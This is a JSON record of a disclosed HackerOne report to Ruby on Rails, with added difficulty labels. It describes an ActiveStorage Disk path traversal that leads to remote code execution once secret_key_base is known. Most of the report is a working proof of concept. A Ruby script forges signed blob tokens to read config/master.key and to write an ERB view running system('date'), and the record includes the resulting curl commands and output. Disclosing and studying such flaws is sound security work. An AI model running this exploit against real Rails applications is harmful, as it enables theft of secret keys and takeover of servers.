{
  "reported_to": "Ruby on Rails",
  "reported_by": "ooooooo_q ",
  "title": "Path traversal in AcitveStorage, and lead RCE",
  "content": "\nThe danger of deserialization has been reduced in Rails 7.1 by increasing the number of settings that do not use Marshal in MessageVerifier.\nHowever, another danger remains with AcitveStorage(service: Disk), which allows path traversal using the key value. However, the attacker must know the value of secret_key_base.\nPoC\nCode 218 Bytes\n1\u276f ruby -v\n2ruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [arm64-darwin22]\n3\n4\u276f rails new disk_traversal_7_1 -G -M -C -A -J -T \n5=>  Rails 7.1.3\n6\n7\u276f bin/rails active_storage:install\n8\n9\u276f RAILS_ENV=production bin/rails db:migrate\nedit config/production.rb\nCode 79 Bytes\n1# config.force_ssl = true\n2...\n3\n4config.active_support.message_serializer = :json\nstart server\nCode 42 Bytes\n1\u276f RAILS_ENV=production bundle exec rails s\ntraversal.rb\nCode 1.56 KiB\n1content_disposition = \"inline\"\n2content_type = \"text/plain\"\n3name = \"disk\"\n4\n5secret_key_base = Rails.application.secret_key_base\n6\n7key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))\n8secret = key_generator.generate_key(\"ActiveStorage\")\n9\n10serializer =  ActiveStorage.verifier.instance_variable_get(:@serializer)\n11puts serializer\n12puts \"--\"\n13\n14\n15key =\"././../config/master.key\"\n16verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)\n17read_token = verifier.generate(\n18          {\n19            key: key,\n20            disposition: content_disposition,\n21            content_type: content_type,\n22            service_name: name\n23          },\n24          purpose: :blob_key\n25        )\n26\n27puts \"read token:\"\n28puts \"#{read_token}\"\n29puts \"read curl: \"\n30puts  \"curl \\\"http://0.0.0.0:3000/rails/active_storage/disk/#{read_token}/test\\\"\"\n31puts \"--\"\n32\n33target_file =\"../app/views/users/show.text.erb\"\n34content = \"<% system('date') %>\"\n35verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)\n36token_write = verifier.generate(\n37          {\n38            key: target_file,\n39            disposition: content_disposition,\n40            content_type: content_type,\n41            content_length: content.bytesize,\n42            service_name: name\n43          },\n44          purpose: :blob_token\n45        )\n46\n47puts \"write target_file:\"\n48puts \"#{target_file}\"\n49puts \"write token:\"\n50puts \"#{token_write}\"\n51puts \"write curl:\"\n52puts \"curl -X PUT -H \\\"Content-type: #{content_type}\\\" -d \\\"#{content}\\\" http://0.0.0.0:3000/rails/active_storage/disk/#{token_write}\"\nCode 1.61 KiB\n1\u276f RAILS_ENV=production bundle exec rails runner traversal.rb\n2W, [2024-01-25T22:57:10.036960 #16497]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting \"config.active_record.sqlite3_production_warning=false\".\n3ActiveSupport::Messages::SerializerWithFallback::JsonWithFallback\n4--\n5read token:\n6eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7\n7read curl:\n8curl \"http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test\"\n9--\n10write target_file:\n11../app/views/users/show.text.erb\n12write token:\n13eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e\n14write curl:\n15curl -X PUT -H \"Content-type: text/plain\" -d \"<% system('date') %>\" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e\nAccess to read curl will get the file at any path, and access to write curl will write to any path and confirm the RCE.\nImpact\nIf secret_key_base is leaked, there is a risk of reading and writing files on the server and thereby an RCE.\n\n",
  "severity": [
    8.1,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1728433560,
  "report_url": "https://hackerone.com/reports/2334455",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a new Rails 7.1.3 application with ActiveStorage configured for disk service"
    ],
    [
      2,
      "Generate a malicious token using the application's secret_key_base to perform path traversal"
    ],
    [
      3,
      "Use the generated token to read or write files on the server via ActiveStorage endpoints"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to perform path traversal attacks via ActiveStorage's disk service by crafting malicious tokens. This can lead to arbitrary file read/write on the server, potentially resulting in remote code execution (RCE) if the attacker knows the application's secret_key_base.",
  "reason": "The attack requires knowledge of the secret_key_base and involves crafting specific tokens to exploit ActiveStorage's file handling. While the steps are straightforward once the secret_key_base is known, the interaction between token generation and file access in ActiveStorage is non-obvious.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}